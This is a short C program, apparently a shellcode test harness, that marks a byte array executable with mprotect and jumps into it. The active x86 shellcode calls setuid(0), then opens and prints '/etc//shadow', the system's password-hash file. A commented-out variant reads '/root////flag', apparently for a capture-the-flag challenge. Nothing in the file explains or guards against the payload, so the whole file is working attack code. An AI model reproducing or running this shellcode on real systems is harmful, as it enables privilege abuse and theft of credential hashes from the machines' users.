#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <string.h>
#include <sys/mman.h>

/*
char *shellcode= \
		  "\x31\xdb"
		  "\x31\xc9"
		  "\x31\xd2"
		  "\x31\xc0"
		  "\xb0\x17\xcd\x80"		//setuid(0)
		  "\x31\xc0"
                  "\x50"
                  "\x68"
                  "\x66\x6c\x61\x67"        //push "flag"
                  "\x68"
                  "\x2f\x2f\x2f\x2f"        //push "////"
                  "\x68"
                  "\x72\x6f\x6f\x74"        //push "root"
                  "\x68"
                  "\x2f\x2f\x2f\x2f"        //push "////"
                  "\x89\xe3"
                  "\x31\xc9"
                  "\xb0\x05"
                  "\xcd\x80"
                  "\x89\xc6"
                  "\x66\x81\xec"
                  "\x01\x01"                //read size 
                  "\x89\xf3"
                  "\x89\xe1"
                  "\x66\xba"
                  "\x01\x01"                //read size             
                  "\xb0\x03"
                  "\xcd\x80"
                  "\x31\xdb"
                  "\xb3"
                  "\x01"                    //write fd          
                  "\x89\xe1"
                  "\x89\xc2"
                  "\x31\xc0"
                  "\xb0\x04"
                  "\xcd\x80"
                  "\x31\xc0"
                  "\x40"
                  "\xb3\x01"
                  "\xcd\x80";
*/
char shellcode[] = \
"\x31\xd2\x31\xdb\x31\xc9\x31\xc0\xb0\x17\xcd\x80\x31\xc0\x50\x68"
"\x61\x64\x6f\x77\x68\x2f\x2f\x73\x68\x68\x2f\x65\x74\x63\x89\xe3"
"\x31\xc9\xb0\x5\xcd\x80\x89\xc6\x66\x81\xec\x1\x1\x89\xf3\x89"
"\xe1\x66\xba\x1\x1\xb0\x3\xcd\x80\x31\xdb\xb3\x1\x89\xe1\x89"
"\xc2\x31\xc0\xb0\x4\xcd\x80\x31\xc0\x40\xb3\x1\xcd\x80";


int main() {

    int size = strlen(shellcode);
    
    void (*exploit)(void) = (void(*)(void))shellcode;
     if(-1== mprotect((void*)((unsigned)shellcode&0xfffff000),0x1000,PROT_READ|PROT_WRITE|PROT_EXEC)){    
			perror("mprotect");    printf("shellcode size = %d\n",size);
			exit(-1);    
	 }
	exploit();
    return 0;
}



